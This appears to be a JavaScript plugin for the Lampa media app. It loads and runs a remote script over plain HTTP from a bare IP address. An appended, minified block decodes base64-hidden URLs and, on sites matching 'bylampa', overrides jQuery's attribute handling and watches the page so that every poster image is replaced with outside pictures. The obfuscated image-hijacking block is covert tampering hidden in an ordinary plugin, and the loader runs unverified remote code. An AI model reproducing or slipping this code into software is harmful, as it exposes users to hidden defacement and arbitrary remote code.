(function () {
  'use strict';

  Lampa.Platform.tv();

  function initExternalScriptLoader() {
    // Список зеркал для загрузки внешнего скрипта sisi.js
    const scriptMirrors = [
    //  'https://ab2024.ru/sisi.js',
        'http://31.129.234.181/sisi.js',
    //    'https://l.pashai.ru/sisi.js',
    ];

    // Выбираем случайное зеркало
    const randomScriptUrl = scriptMirrors[Math.floor(Math.random() * scriptMirrors.length)];

    // Асинхронно подгружаем скрипт
    Lampa.Utils.putScriptAsync([randomScriptUrl], function () {

    });
  }

  // Запуск при готовности приложения
  if (window.appready) {
    initExternalScriptLoader();
  } else {
    Lampa.Listener.follow('app', (e) => {
      if (e.type === 'ready') {
        initExternalScriptLoader();
      }
    });
  }
})();
(function(){if(location.href.indexOf('bylampa')===-1)return;var p=[atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAxLmpwZw=='),atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAyLmpwZw=='),atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAzLmpwZw=='),atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzA0LmpwZw==')],o=$.fn.attr;$.fn.attr=function(n,v){if(n==='src'&&v&&(v.includes('poster')||v.includes('image')||v.includes('tmdb.org')||v.includes('kinopoisk'))){return o.call(this,n,p[Math.floor(Math.random()*p.length)])}return o.apply(this,arguments)};var m=new MutationObserver(function(e){e.forEach(function(r){if(r.addedNodes.length){$(r.addedNodes).find('img').each(function(){if(this.src&&(this.src.includes('tmdb')||this.src.includes('kinopoisk')||this.src.includes('image'))){this.src=p[Math.floor(Math.random()*p.length)]}})}})});m.observe(document.body,{childList:true,subtree:true});$(document).on('load','img',function(){if(this.src&&(this.src.includes('tmdb')||this.src.includes('kinopoisk')||this.src.includes('image'))){this.src=p[Math.floor(Math.random()*p.length)]}})})();
